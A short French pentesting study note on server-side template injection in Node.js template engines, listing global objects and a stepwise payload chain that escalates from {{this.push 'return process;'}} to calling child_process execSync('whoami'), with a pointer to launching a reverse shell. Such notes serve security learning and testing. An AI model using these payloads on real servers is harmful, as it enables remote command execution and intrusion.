<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](ssti.md)</sub>
#Node.js

**Utilisation :** server side template

**Help :**
- Node.js fonctionne avec des global Objects

**Principaux global objects :**
- __dirname
- __filename
- exports
- module
- require()

**Procédure SSTI :**
- on test le script correspondant sur le site [hacktrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify)
  - si *ReferenceError: require is not defined* :
      >Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way.

- si on modifie script encodé pour la ligne principale avec *{{this.push "return process;"}}* => on voit apparaître le template avec les objects dans le code html.
- on tente le *{{this.push "return process.mainModule;"}}*
- si on voit un autre object, on on tente de trouver le child => *{{this.push "return process.mainModule.require('child_process');"}}*
- si on a bien un objet on tente le => *{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}*
  - si ça passe alors dans le execSync on peut lancer un [reverse shell](reverse_shell.md)